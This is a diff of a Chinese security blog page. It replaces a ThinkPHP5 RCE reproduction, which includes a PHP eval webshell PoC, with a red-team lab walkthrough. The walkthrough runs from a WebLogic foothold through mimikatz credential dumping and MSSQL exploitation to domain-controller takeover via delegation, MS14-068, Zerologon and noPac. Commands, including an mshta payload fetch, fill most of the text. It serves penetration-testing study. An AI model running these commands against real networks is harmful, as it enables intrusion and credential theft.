@@ -6,25 +6,61 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://laohuan12138.github.io">
-  <title>ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 | Laohuan&#39;s Blog</title>
+  <title>渗透攻击红队靶场 | Laohuan&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="背景ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。">
+  <meta name="description" content="简介本靶场由渗透攻击红队saulGoodman制作，集成ms14-018、ms17-010、约束委派等多个漏洞可利用。 感兴趣的可到渗透攻击红队公众号领取靶场，顺便关注下这位作者的知识星球，人家整个靶场也不容易。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP5 5.0.22&#x2F;5.1.29 远程代码执行漏洞">
-<meta property="og:url" content="https://laohuan12138.github.io/2020/06/13/ThinkPHP%205.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="渗透攻击红队靶场">
+<meta property="og:url" content="https://laohuan12138.github.io/2021/12/24/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA/index.html">
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
-<meta property="og:description" content="背景ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。">
+<meta property="og:description" content="简介本靶场由渗透攻击红队saulGoodman制作，集成ms14-018、ms17-010、约束委派等多个漏洞可利用。 感兴趣的可到渗透攻击红队公众号领取靶场，顺便关注下这位作者的知识星球，人家整个靶场也不容易。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_17-32-26.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_17-35-46.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_20-50-06.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-13_20-54-13.png">
-<meta property="article:published_time" content="2020-06-13T12:59:28.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.872Z">
+<meta property="og:image" content="https://cdn.laohuan.art/WechatIMG2.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_14-42-21.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_15-00-11.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_15-51-36-mshta%E4%B8%8A%E7%BA%BF.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_15-57-04-ipconfig.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_15-58-09-%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_16-04-40-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_16-35-32-venom.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_16-02-47-arp.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-13_19-35-35.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-20_13-36-56.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-20_13-50-35.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-20_14-02-51.png">
+<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-11-20_14-06-42.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-23_04-5%E8%BF%9B%E7%A8%8B.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-24_05-32-%E6%8A%93%E5%AF%86%E7%A0%81.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-26_06-35spn.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-24_06-02-fscan.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-27_04-01sa%E5%AF%86%E7%A0%81.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-27_04-16.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-27_04-21sql%E4%B8%8A%E7%BA%BF.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-11-27_06-34%E6%8F%90%E6%9D%83.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-09_06-10.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-10_06-15ldap.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-10_06-48-%E7%94%B3%E8%AF%B7TGT.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-10_06-55-%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7ST.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-10_07-04-%E5%AF%BC%E5%85%A5ST2.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-06_00-24.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-06_00-40.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-07_05-00.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-13_07-02.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-13_07-04.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-13_07-07.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-14_22-29.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-18_14-03-nopac1.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-18_14-03-nopac2.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-18_13-57.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-18_16-19.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-18_16-20.png">
+<meta property="og:image" content="https://cdn.laohuan.art/2021-12-18_17-41.png">
+<meta property="article:published_time" content="2021-12-24T03:16:25.000Z">
+<meta property="article:modified_time" content="2021-12-24T07:39:03.250Z">
 <meta property="article:author" content="Laohuan">
-<meta property="article:tag" content="ThinkPHP">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.laohuan.art/2020-06-13_17-32-26.png">
+<meta name="twitter:image" content="https://cdn.laohuan.art/WechatIMG2.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -242,14 +278,14 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-ThinkPHP 5.0.22-5.1.29远程代码执行漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-渗透攻击红队靶场" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
+      渗透攻击红队靶场
     </h1>
   
 
@@ -258,46 +294,199 @@
         
         
         
-<a href="/2020/06/13/ThinkPHP%205.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2020-06-13T12:59:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-13</time>
+<a href="/2021/12/24/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA/" class="archive-article-date">
+  	<time datetime="2021-12-24T03:16:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-24</time>
 </a>
         
 		
 	
       </header>
 	  <div align="center" class="post-count">
-    字数：229字 | 预计阅读时长：1分钟
+    字数：1.3k字 | 预计阅读时长：5分钟
 </div>
 	  
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4><span id="背景">背景</span></h4><p>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>
+        <h3><span id="简介">简介</span></h3><p>本靶场由渗透攻击红队saulGoodman制作，集成ms14-018、ms17-010、约束委派等多个漏洞可利用。</p>
+<p>感兴趣的可到渗透攻击红队公众号领取靶场，顺便关注下这位作者的知识星球，人家整个靶场也不容易。</p>
 <a id="more"></a>
 
-<h4><span id="复现过程">复现过程</span></h4><h5><span id="phpinfo信息">phpinfo信息</span></h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure>
+<img src="https://cdn.laohuan.art/WechatIMG2.png" style="zoom:67%;">
 
+<h3><span id="0x1-立足点">0x1 立足点</span></h3><p>1.常规端口扫描，发现开放7001端口,为weblogic服务</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_14-42-21.png" alt></p>
+<p>2.检测weblogic相关漏洞，存在多个漏洞。</p>
+<img src="https://cdn.laohuan.art/Snipaste_2021-11-13_15-00-11.png" style="zoom: 67%;">
 
+<p>3.使用cve-2019-2725上线msf</p>
+<p>使用msf hta模块,当然也可使用powershell上线</p>
+<p> <code>exploit/windows/misc/hta_server</code></p>
+<p>远程命令执行，成功上线</p>
+<p><code>mshta http://192.168.1.9:8080/WJw1Bh77010.hta</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_15-51-36-mshta%E4%B8%8A%E7%BA%BF.png" alt></p>
+<p>4.查看存在双网卡</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_15-57-04-ipconfig.png" alt></p>
+<p>且为工作组环境，无域</p>
+<p><code>net config workstation</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_15-58-09-%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83.png" alt></p>
+<p>5.添加路由</p>
+<p><code>run get_local_subnets</code></p>
+<p><code>run autoroute -s 10.10.20.0/24</code></p>
+<p><code>run autoroute -p</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_16-04-40-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1.png" alt></p>
+<p>6.添加socks代理</p>
+<p>前几天发现了一款代理工具，顺便试一试。</p>
+<p><a href="https://github.com/Dliv3/Venom.git" target="_blank" rel="noopener">Venom</a></p>
+<p>服务端开启监听</p>
+<p><code>./admin_linux_x64 -lport 9999</code></p>
+<p>上传agent，连接服务端</p>
+<p><code>agent.exe -rhost 192.168.1.9 -rport 9999</code></p>
+<p>查看节点</p>
+<p><code>show</code></p>
+<p>进入节点1</p>
+<p><code>goto 1</code></p>
+<p>开启socks代理，监听8888端口</p>
+<p><code>socks 8888</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_16-35-32-venom.png" alt></p>
+<h3><span id="0x2-横向win7">0x2 横向Win7</span></h3><p>1.查看路由表,发现一台10.10.20.7的机器</p>
+<p><code>arp -a</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_16-02-47-arp.png" alt></p>
+<p>2.上传ladon扫描内网，发现10.10.20.0段除了weblogic那台服务器，就只剩一台地址为10.10.20.7的win7,且存在ms17_010</p>
+<ul>
+<li><code>ladon64.exe 10.10.20.0/24 onlinepc</code> </li>
+<li><code>ladon64.exe 10.10.20.0/24 ms17010</code> </li>
+<li><code>ladon64.exe 10.10.20.7 portscan</code></li>
+</ul>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-13_19-35-35.png" alt></p>
+<p>3.win7不出网，使用ms17_010正向shell拿下win7</p>
+<img src="https://cdn.laohuan.art/Snipaste_2021-11-20_13-36-56.png" style="zoom:67%;">
 
-<p><img src="http://cdn.laohuan.art/2020-06-13_17-32-26.png" alt></p>
-<h5><span id="远程命令执行">远程命令执行</span></h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:端口/index.php?s=index/think\app/invokefunction&amp;function=call*_user_*func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+<p>4.发现存在域<strong>redteam.red</strong></p>
+<p><code>systeminfo</code></p>
+<p>查看域用户 <code>net user /domain</code></p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-20_13-50-35.png" alt></p>
+<p>5.查看域控，发现域控主机名<strong>owa</strong>，地址为10.10.10.8</p>
+<ul>
+<li><code>net time /domain</code></li>
+<li><code>net group &quot;domain controllers&quot; /domain</code></li>
+<li><code>nltest /DCLIST:redteam</code></li>
+<li><code>ping owa</code></li>
+</ul>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-20_14-02-51.png" alt></p>
+<p>6.查询域管理员，为administrator</p>
+<p><img src="https://cdn.laohuan.art/Snipaste_2021-11-20_14-06-42.png" alt></p>
+<p>7.查询进程，无域管进程，无法token窃取</p>
+<p><img src="https://cdn.laohuan.art/2021-11-23_04-5%E8%BF%9B%E7%A8%8B.png" alt></p>
+<p>8.抓取win7密码 <strong>Saul:admin!@#45</strong></p>
+<p><code>load kiwi</code></p>
+<p><code>creds_all</code></p>
+<p><img src="https://cdn.laohuan.art/2021-11-24_05-32-%E6%8A%93%E5%AF%86%E7%A0%81.png" alt></p>
+<h3><span id="0x3-数据库服务器">0x3 数据库服务器</span></h3><p>1.查询SPN信息,发现存在exchange、sqlserver等服务。</p>
+<p><code>setspn -T redteam.red -q */*</code></p>
+<p><img src="https://cdn.laohuan.art/2021-11-26_06-35spn.png" alt></p>
+<p>2.或者使用fscan</p>
+<p><code>fscan64.exe -h 10.10.10.0/24</code></p>
+<p><img src="https://cdn.laohuan.art/2021-11-24_06-02-fscan.png" alt>        </p>
+<p>可以看到数据库服务器为10.10.10.18这台机器，且fscan已经扫描出来存在<strong>sa:sa</strong>的弱口令</p>
+<p>3.也可以使用msf的sqlserver爆破模块</p>
+<p>先添加路由<code>run autoroute -s 10.10.10.0/24</code></p>
+<p><code>auxiliary/scanner/mssql/mssql_login</code></p>
+<p><img src="https://cdn.laohuan.art/2021-11-27_04-01sa%E5%AF%86%E7%A0%81.png" alt></p>
+<p>4.已经拿到sqlserver口令，使用xp_cmdshell执行命令</p>
+<p><code>auxiliary/admin/mssql/mssql_exec</code></p>
+<p><img src="https://cdn.laohuan.art/2021-11-27_04-16.png" alt></p>
+<p>可以执行，但权限太小</p>
+<p>5.使用clr正向shell拿下数据库服务器</p>
+<p><code>exploit/windows/mssql/mssql_clr_payload</code></p>
+<p><img src="https://cdn.laohuan.art/2021-11-27_04-21sql%E4%B8%8A%E7%BA%BF.png" alt></p>
+<p>6.使用ms14_058提升权限</p>
+<p><code>exploit/windows/local/ms14_058_track_popup_menu</code></p>
+<p><img src="https://cdn.laohuan.art/2021-11-27_06-34%E6%8F%90%E6%9D%83.png" alt></p>
+<p>成功提升至系统权限</p>
+<p>7.抓取密码 <strong>sqlserver:Server12345</strong></p>
+<p><code>load kiwi</code></p>
+<p><code>creds_wdigest</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-09_06-10.png" alt></p>
+<h3><span id="0x4-域控">0x4 域控</span></h3><h4><span id="1-约束委派">1. 约束委派</span></h4><p>1.查询设置了约束委派的用户(需域内任意账户密码,前期已获取win7账户密码)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 ldapsearch  -LLL -x -H ldap://10.10.10.8:389 -D <span class="string">"saul@redteam.red"</span> -w <span class="string">'admin!@#45'</span>  -b dc=redteam,dc=red <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> | grep -iE <span class="string">"distinguishedName</span></span><br></pre></td></tr></table></figure>
 
-
-
-<p><img src="http://cdn.laohuan.art/2020-06-13_17-35-46.png" alt></p>
-<h5><span id="写shell">写shell</span></h5><p>1.先将一句话马进行url编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3c%3fphp+eval(%24_POST%5b123%5d)+%3f%3e</span><br></pre></td></tr></table></figure>
-
-<p>2.POC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;IP:端口&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call*_user_*func*_array&amp;vars[0]&#x3D;file_*put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;%3c%3fphp+eval(%24_POST%5b123%5d)+%3f%3e</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="http://cdn.laohuan.art/2020-06-13_20-50-06.png" alt></p>
-<p>3.蚁剑连接</p>
-<p><code>http://IP:端口/shell.php</code></p>
-<p><img src="http://cdn.laohuan.art/2020-06-13_20-54-13.png" alt></p>
-<h4><span id="参考链接">参考链接</span></h4><p><a href="https://www.cnblogs.com/bmjoker/p/10110868.html/" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/10110868.html/</a></p>
+<p><img src="https://cdn.laohuan.art/2021-12-10_06-15ldap.png" alt></p>
+<p>sqlserver用户配置了约束委派，且密码也已获取，可尝试约束委派攻击</p>
+<p>2.使用kekeo请求TGT</p>
+<p>工具地址：<a href="https://github.com/gentilkiwi/kekeo/" target="_blank" rel="noopener">kekeo</a></p>
+<p><code>tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:sqlserver.kirbi</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-10_06-48-%E7%94%B3%E8%AF%B7TGT.png" alt></p>
+<p>3.使用申请的TGT伪造administrator的ticket</p>
+<p><code>tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-10_06-55-%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7ST.png" alt></p>
+<p>4.使用mimikatz导入伪造的票据</p>
+<p>先清空内存中的票据 <code>KLIST PURGE</code></p>
+<p><code>kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</code></p>
+<p>成功访问域控 <code>dir \\owa\c$</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-10_07-04-%E5%AF%BC%E5%85%A5ST2.png" alt></p>
+<h4><span id="2-ms14-068">2. ms14-068</span></h4><p>工具地址：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">ms14-068.exe</a></p>
+<p>1.利用前提已获取域内一账户密码，且未打补丁<strong>KB3011780</strong></p>
+<p>获取sid <code>whoami /user</code> 或者 <code>wmic useraccount get name,sid</code></p>
+<p>2.伪造证书</p>
+<p><code>MS14-068.exe -u saul@redteam.red -p admin!@#45 -s S-1-5-21-1359007890-1682372173-1631803504 -d owa.redteam.red</code></p>
+<p>3.清空凭据</p>
+<p><code>klist purge</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-06_00-24.png" alt></p>
+<p>4.使用mimikatz导入生成的证书</p>
+<p><code>kerberos::ptc TGT_saul@redteam.red.ccache</code></p>
+<p>5.退出mimikatz,成功访问域控</p>
+<p><code>dir \\owa\c$</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-06_00-40.png" alt></p>
+<p>6.或者使用goldenPac直接获得一个shell（ms14-068+psexec）</p>
+<p>工具地址：<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">impacket-example-windows</a></p>
+<p><code>goldenPac.exe redteam.red/saul:admin!@#45@owa.redteam.red</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-07_05-00.png" alt></p>
+<h4><span id="3-cve-2020-1472谨慎使用">3. CVE-2020-1472(谨慎使用)</span></h4><p>1.使用exp将域控密码置空</p>
+<p><code>python3 cve-2020-1472-exploit.py owa 10.10.10.8</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-13_07-02.png" alt></p>
+<p>2.获取hash</p>
+<p><code>python3 secretsdump.py redteam.red/owa\$@10.10.10.8  -just-dc -no-pass</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-13_07-04.png" alt></p>
+<p>3.获得administrator的hash,直接psexec</p>
+<p><code>python3 psexec.py administrator@10.10.10.8 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-13_07-07.png" alt></p>
+<p><strong>注意</strong>：此方法可能导致脱域，获取权限后请将域控密码还原</p>
+<p>还原请参考链接<a href="https://www.jianshu.com/p/525be0335404" target="_blank" rel="noopener">https://www.jianshu.com/p/525be0335404</a></p>
+<h4><span id="4-cve-2021-42287-amp-cve-2021-42278">4. CVE-2021-42287 &amp; CVE-2021-42278</span></h4><pre><code>补丁：</code></pre><ul>
+<li>KB5008602</li>
+<li>KB5008380</li>
+</ul>
+<p>1.直接脚本小子一把梭 <a href="https://github.com/Ridter/noPac" target="_blank" rel="noopener">noPac</a></p>
+<p>检查漏洞情况,不使用ldap协议会报错</p>
+<p><code>python3 scanner.py redteam.red/sqlserver:Server12345  -dc-ip 10.10.10.8 -use-ldap</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-14_22-29.png" alt></p>
+<p>2.直接获取域控shell</p>
+<p><code>proxychains python3 noPac.py redteam.red/saul:&#39;admin!@#45&#39;  -dc-ip 10.10.10.8  -dc-host owa  -shell --impersonate administrator -use-ldap</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-18_14-03-nopac1.png" alt></p>
+<p><img src="https://cdn.laohuan.art/2021-12-18_14-03-nopac2.png" alt></p>
+<p>3.也可以使用sam_the_admin</p>
+<p>exp: <a href="https://github.com/WazeHell/sam-the-admin" target="_blank" rel="noopener">sam_the_admin.py</a></p>
+<p><code>python3 sam_the_admin.py &#39;redteam/saul:admin!@#45&#39; -dc-ip 10.10.10.8 -shell</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-18_13-57.png" alt></p>
+<h4><span id="其他">其他</span></h4><p>或者可以在dc上把win7账户saul加入管理组，获得域管权限</p>
+<p><code>net localgroup administrators /add redteam.red\saul</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-18_16-19.png" alt></p>
+<p>dsync导出hash</p>
+<p><code>lsadump::dcsync /domain:redteam.red /all /csv</code></p>
+<p><img src="https://cdn.laohuan.art/2021-12-18_16-20.png" alt></p>
+<p>hash传递拿下域控，抓取域管密码</p>
+<p><img src="https://cdn.laohuan.art/2021-12-18_17-41.png" alt></p>
+<h3><span id="0x5-参考链接">0x5 参考链接</span></h3><ul>
+<li><p><a href="https://www.jianshu.com/p/525be0335404" target="_blank" rel="noopener">https://www.jianshu.com/p/525be0335404</a></p>
+</li>
+<li><p><a href="https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/lhh134/article/details/104139081" target="_blank" rel="noopener">https://blog.csdn.net/lhh134/article/details/104139081</a></p>
+</li>
+<li><p><a href="https://www.jianshu.com/p/525be0335404" target="_blank" rel="noopener">https://www.jianshu.com/p/525be0335404</a></p>
+</li>
+</ul>
 
       
 
@@ -341,7 +530,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ThinkPHP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">靶场</a>
         		</li>
       		
 		</ul>
@@ -353,7 +542,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/漏洞复现//" class="article-tag-list-link color5">漏洞复现</a>
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -408,7 +597,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://laohuan12138.github.io/2020/06/13/ThinkPHP%205.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://laohuan12138.github.io/2021/12/24/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -422,18 +611,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/06/14/ThinkPHP5-5-0-23-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ThinkPHP5 5.0.23 远程代码执行漏洞
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/06/13/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">ThinkPHP 2.x 任意代码执行漏洞</div>
+    <a href="/2021/12/11/Log4J%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Apache Log4J漏洞复现</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -460,7 +640,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#"><span class="toc-number">2.1.</span> <span class="toc-text">phpinfo信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#"><span class="toc-number">2.2.</span> <span class="toc-text">远程命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#"><span class="toc-number">2.3.</span> <span class="toc-text">写shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">0x1 立足点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">3.</span> <span class="toc-text">0x2 横向Win7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">4.</span> <span class="toc-text">0x3 数据库服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">5.</span> <span class="toc-text">0x4 域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">5.1.</span> <span class="toc-text">1. 约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">5.2.</span> <span class="toc-text">2. ms14-068</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">5.3.</span> <span class="toc-text">3. CVE-2020-1472(谨慎使用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">5.4.</span> <span class="toc-text">4. CVE-2021-42287 &amp; CVE-2021-42278</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">5.5.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">6.</span> <span class="toc-text">0x5 参考链接</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -476,7 +656,7 @@
   
 
   
-  <div id="SOHUCS" sid="ThinkPHP 5.0.22-5.1.29远程代码执行漏洞" ></div> 
+  <div id="SOHUCS" sid="渗透攻击红队靶场" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
